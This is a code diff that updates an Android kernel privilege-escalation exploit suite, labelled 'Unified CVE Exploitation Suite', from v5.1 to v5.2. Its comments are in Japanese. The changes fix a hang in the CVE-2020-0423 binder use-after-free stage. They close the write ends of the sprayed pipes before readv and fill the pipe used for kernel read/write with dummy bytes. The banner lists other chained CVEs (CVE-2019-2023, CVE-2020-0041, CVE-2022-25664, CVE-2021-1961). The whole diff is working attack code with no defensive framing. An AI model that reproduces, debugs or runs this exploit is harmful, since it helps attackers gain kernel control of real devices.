@@ -420,7 +420,10 @@ static int exploit_cve_2022_25664_leak(uint64_t *out_addr, uint64_t *out_kernel_
     return found ? 0 : -1;
 }
 
-/* ---- CVE-2020-0423 RW with spray ---- */
+/* ============================================================
+   改良版 CVE-2020-0423 RW (ハング修正済み)
+   readv 前に書き込み端をクローズしてブロックを防止
+   ============================================================ */
 static int exploit_cve_2020_0423_rw(void) {
     printf("[*] Attempting kernel RW via CVE-2020-0423 UAF (spray after free) ...\n");
 
@@ -489,6 +492,11 @@ static int exploit_cve_2020_0423_rw(void) {
             continue;
         }
 
+        /* ★★★ 修正点: readv の前に全パイプの書き込み端を閉じる ★★★ */
+        for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
+            close(spray_pipes[j][1]);
+        }
+
         int found = 0;
         for (int off = 0; off < PAGE_SIZE && !found; off += 8) {
             struct iovec iov[2];
@@ -521,9 +529,11 @@ static int exploit_cve_2020_0423_rw(void) {
             }
         }
 
+        /* 読み取り端を閉じる */
         for (int j = 0; j < SPRAY_PIPE_COUNT; j++) {
-            close(spray_pipes[j][0]); close(spray_pipes[j][1]);
+            close(spray_pipes[j][0]);
         }
+
         close(binder_fd);
         close(epoll_fd);
         wait(NULL);
@@ -531,6 +541,10 @@ static int exploit_cve_2020_0423_rw(void) {
         if (found) {
             if (pipe(g_krw_pipe) < 0) return -1;
             if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) return -1;
+            /* ダミーデータを書き込んでおく */
+            char dummy[PAGE_SIZE];
+            memset(dummy, 0x41, PAGE_SIZE);
+            write(g_krw_pipe[1], dummy, PAGE_SIZE);
             return 0;
         }
         printf("  [-] No usable kernel pointer in attempt %d\n", attempt);
@@ -963,7 +977,7 @@ int main(void) {
     uint64_t leaked_addr = 0;
 
     printf("==================================================\n");
-    printf("  Unified CVE Exploitation Suite v5.1\n");
+    printf("  Unified CVE Exploitation Suite v5.2\n");
     printf("  (CVE-2019-2023, 2020-0041, 2020-0423,\n");
     printf("   CVE-2022-25664, CVE-2021-1961,\n");
     printf("   CVE-2023-20938-inspired)\n");
@@ -1003,7 +1017,7 @@ int main(void) {
     }
     if (!gpu_leak_ok) printf("  [-] GPU leak failed\n");
 
-    printf("\n[PHASE 5] CVE-2020-0423 (UAF) Kernel RW with improved spray\n");
+    printf("\n[PHASE 5] CVE-2020-0423 (UAF) Kernel RW with improved spray (FIXED HANG)\n");
     if (run_exploit_with_timeout(exploit_cve_2020_0423_rw, 60) == 0) {
         kernel_rw_obtained = 1;
         printf("  [+] Kernel RW via CVE-2020-0423 obtained!\n");
